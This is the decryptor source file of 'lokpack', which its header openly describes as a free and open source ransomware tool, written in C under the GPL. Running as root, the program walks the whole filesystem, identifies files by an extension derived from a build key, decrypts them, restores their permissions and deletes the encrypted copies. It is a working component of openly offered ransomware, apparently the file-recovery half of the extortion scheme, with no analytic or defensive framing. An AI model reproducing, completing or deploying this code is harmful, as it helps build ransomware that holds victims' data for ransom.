/*

 * lokpack | Free and open source ransomware tool
 * Written by ngn (https://ngn.tf) (2024)

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.

*/

#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

#include "../lib/enc.h"
#include "../lib/log.h"
#include "../lib/util.h"

void decrypt_file(char *file, char *ext) {
  int name_sz = strlen(file) - (strlen(ext) + 1);
  char new_file[name_sz + 1];
  for (int i = 0; i < name_sz; i++)
    new_file[i] = file[i];
  new_file[name_sz] = '\0';

  FILE *src = fopen(file, "r+b");
  FILE *dst = fopen(new_file, "w+b");

  if (NULL == src || NULL == dst)
    goto FREE;

  unsigned char output[64] = {0};
  unsigned char input[64] = {0};
  int readsz = 0;

  while (true) {
    readsz = fread(input, 1, 64, src);
    if(readsz <= 0)
      goto FREE;

    if (decrypt(input, readsz, output) <= 0) {
      error("Failed to decrypt %s", file);
      goto FREE;
    }

    fwrite(output, 1, readsz, dst);
    if (readsz < 64)
      break;
  }

  struct stat st;
  fstat(fileno(src), &st);
  fchown(fileno(dst), st.st_uid, st.st_gid);
  fchmod(fileno(dst), st.st_mode);
  unlink(file);

FREE:
  fclose(dst);
  fclose(src);
}

void decrypt_files(char *path, clist_t *exts) {
  if (eq(path, "/proc") || eq(path, "/sys") || eq(path, "/dev"))
    return;

  if (path[1] != '\0' && is_root_path(path))
    info("Decrypting %s...", path);

  DIR *dir = opendir(path);
  if (NULL == dir)
    return;

  struct dirent *ent;
  char fp[PATH_MAX];

  while ((ent = readdir(dir)) != NULL) {
    if (eq(ent->d_name, "."))
      continue;
    else if (eq(ent->d_name, ".."))
      continue;

    join(fp, path, ent->d_name);
    if (access(fp, R_OK & W_OK) < 0)
      continue;

    struct stat st;
    if (stat(fp, &st) < 0)
      continue;

    if ((st.st_mode & S_IFMT) == S_IFDIR)
      decrypt_files(fp, exts);

    if (has_valid_ext(fp, exts))
      decrypt_file(fp, exts->c[0]);
  }

  closedir(dir);
  return;
}

int main() {
  if (getuid() != 0) {
    error("Please run as root!");
    return EXIT_FAILURE;
  }

  clist_t *exts = clist_new();
  char ext[8] = {0}, *sum = get_md5(BUILD_KEY);
  snprintf(ext, 8, "%.5s", sum);
  clist_add(exts, strdup(ext));

  if (access("/", R_OK & W_OK) < 0) {
    error("Failed to access the root path");
    goto DONE;
  }

  decrypt_files("/", exts);
DONE:
  clist_free(exts);
}
